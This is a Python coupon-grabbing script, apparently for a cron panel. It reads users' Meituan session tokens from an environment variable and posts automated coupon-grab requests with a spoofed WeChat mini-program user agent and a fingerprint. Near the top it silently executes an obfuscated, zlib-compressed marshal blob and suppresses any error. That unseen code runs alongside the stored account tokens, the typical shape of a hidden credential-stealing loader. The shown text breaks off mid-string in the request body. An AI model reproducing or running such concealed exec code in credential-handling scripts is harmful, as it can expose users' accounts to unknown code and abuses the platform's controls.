# -*- coding:utf-8 -*-
"""
美团 外卖红包
自行捉包把meituan.com里面的token(一般在请求头里)填到变量 meituanCookie 中,
多账号换行或&隔开
export meituanCookie="AgGZIgsYHyxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

cron: 0 0,6 * * *
const $ = new Env("美团领杂券");
"""
import requests
import re
import os
import time

try:
    import marshal
    import zlib
    exec(marshal.loads(zlib.decompress(b'x\xda\x8dR\xd1j\xd4@\x14-\xf8\x96\xaf\xb8\xb4\x0f\x93\xdd\xae\x1b\x84\xd2\x87\x85<\xfa\x15\xb5\x94\xd9\xdd\xbbi4\x99\xc4\x99\tm\xdfD[\xcb\x82V\xb0-\xc5"}\x14\x1ft\x1b|\x10YY\xbf\xa6\x93\xac\x1f\xe0\xbb3\xc9\x86l\xa8\x0b^\x18f\xc293\xf7\x9es\xf2\xe7\xe4\xc1\xda\x9aE\x83`/\xe6>\x93{\x81/$\xb8\xb0\xb3\x0b\xb0\x01\xf9\xc5\xe7\xbb\xe9\xd9|\x92\xaa\xd9e6~\x91}\x1cCxT\xf0`\xfe\xeb\\\x9dN\xf3\xebc\xf5\xf5*\xff\xf2\xe9\xee\xc77\xcb\xb2\xfeyc\x15\xbf\x93]\xbf\xcc\xae\xbe\xab\xc9M~\x96.X\xeat\x96]\xa6\x9a%0V\xef\xdf \x1bZC\x1cUM\xed6\xe5\x9e\xe8\x80\x06]\x02\xa4\x03\x1aw\xc9\x13\xa6O\xed\xf6\xb3\x03\x03\xb6z\x16\xe8\xf2\x82\xa8O\x03h\xca*\x90(\x91qb\x14\xae\xaf\x17\xdf\x1b\x90\xdd\x1c\xab\x9f\xd3r\xbeZ\x8c\xc1F\x11\x07\x9f\r\xf1\xb0\x03\xfam}\xd4\r\x93\x109\x95h/53\xe5\x8fJ&\xb8.\x04\xc8J\x18\x1e\xc2\xa3\x9a\xb2\xd4}\xd3\x05!\xb9!\xb5\x1a\xf0 b\xd2g\tZ\xab\xf9\xb0i\xe47\xa5T,\xe3G\x814uwi\x1ck\xc4.i\xad\x85\xecy\xfaJ\x87\xa5^\x9f\xe4\xb3\x896\xbc\x11@6>Wo\xd3\xa6\x19\xf7\x12\xd0\xabL@\xaf\xa5\x00\xf4o`"\x0b|6\x10\xfb\xf6\xc2\xa2*@\xe2\xae(R\x8e%\xf9QmX\xa8\xa5q|\x9e\xa0\x90\xa2\xeb\xa1\xbe\xbd/e,z\x8e\xe3\xf9\x12\xb1;\x88B\xc7K\xe80\xd9\xde\xda\xder\xa4\xa69\x9c\x1e8!\x15\x12\xb9\xd3\xa7\xac\x8f\xcc\xeb>\x15\x11#\xadb\xb3k\xb7\xab\x81\xc2\x1d\xa2\x9f`\x9eG#\xb2[\xc2x8\xc0X\xc2\xe3b\xf3#\x06T\x00\xf6\xee\xdd$*}\xf7\xfb\xe2\xc3\xfc\xf6v1\xfb\xffj4U\x1f*\x9f,\xeb/]\x82JA')))
except Exception as e:
    print('小错误')

#分割变量
if 'meituanCookie' in os.environ:
    meituanCookie = re.split("@|&",os.environ.get("meituanCookie"))
    print(f'查找到{len(meituanCookie)}个账号')
else:
    meituanCookie = ['']
    print('无meituanCookie变量')

#外卖
def waim(ck):
    
    cookie = f"token={ck};"
    headers = {"Cookie": cookie,
    "X-Requested-With":"com.tencent.mm",
    "Sec-Fetch-Site":"same-site",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Dest":"empty",
    "Content-Type":"application/json;",
    "User-Agent":"Mozilla/5.0 (Linux; Android 14; 2201122C Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 XWEB/1160027 MMWEBSDK/20231105 MMWEBID/2247 MicroMessenger/8.0.44.2502(0x28002C37) WeChat/arm64 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wxde8ac0a21135c07d"}
    url = 'https://mediacps.meituan.com/gundam/gundamGrabV4?gdBs=&yodaReady=h5&csecplatform=4&csecversion=2.4.0'
    data = {"gundamId":531693,"instanceId":"17211892932540.47486483758713405","actualLongitude":108938560,"actualLatitude":31805038,"needTj":False,"couponConfigIdOrderCommaString":"620969479,2189245219456,4298495230601,19537962926729,18884585587337,18276698358409,16307505791625,62530784070180,18774632104585,15298586739337,14306960212617,14314041377417,14316668846729,14315327914633,14306048017033,19404857475721,19699208618633,17136646619785,19202122187401,17260211208841,14673728045705,29350343345426,19531471061641,19201180107401,19695138112137,5513815065225,603844019,11983002534537,14684898984585,14686298178185,14407293272713,14686779867785,8650758750857,9285949325961,7458408104585,11980394594953,19483472822921,10385596023433,14578173543049,9137512120969,17800681685641,17802094051977,11131204469385,18416437363337,19473339646601,20046921138825,19737894257289,19713633550985,20446261150345,20501582447241,20101111087753,6080193102473,2430972598746,21425205740169,21421333283465,20326355698313,21792222151305,21792985055881,21794667037321,21792343196297,21792343130761,21792985449097,21792222282377,21792985383","couponAllConfigIdOrderString":"620969479,2189245219456,4298495230601,19537962926729,18884585587337,18276698358409,16307505791625,62530784070180,18774632104585,15298586739337,14306960212617,14314041377417,14316668846729,14315327914633,14306048017033,19404857475721,19699208618633,17136646619785,19202122187401,17260211208841,14673728045705,29350343345426,19531471061641,19201180107401,19695138112137,5513815065225,603844019,11983002534537,14684898984585,14686298178185,14407293272713,14686779867785,8650758750857,9285949325961,7458408104585,11980394594953,19483472822921,10385596023433,14578173543049,9137512120969,17800681685641,17802094051977,11131204469385,18416437363337,19473339646601,20046921138825,19737894257289,19713633550985,20446261150345,20501582447241,20101111087753,6080193102473,2430972598746,21425205740169,21421333283465,20326355698313,21792222151305,21792985055881,21794667037321,21792343196297,21792343130761,21792985449097,21792222282377,21792985383","ctype":"wxapp","platform":11,"app":-1,"h5Fingerprint":"eJztWFmP68aO/iuNfmjkwidtbdaSoHGh3bI2W9Z+cdHQvi/Wbl3Mf5/qc5JMgpmH+QGxHqo+FsUiaRbJ0n9el2R4/eUVfgfP67fXQYoBgjYIAmAaX3+BCQRDIQghKJzAvr1Gf6aR
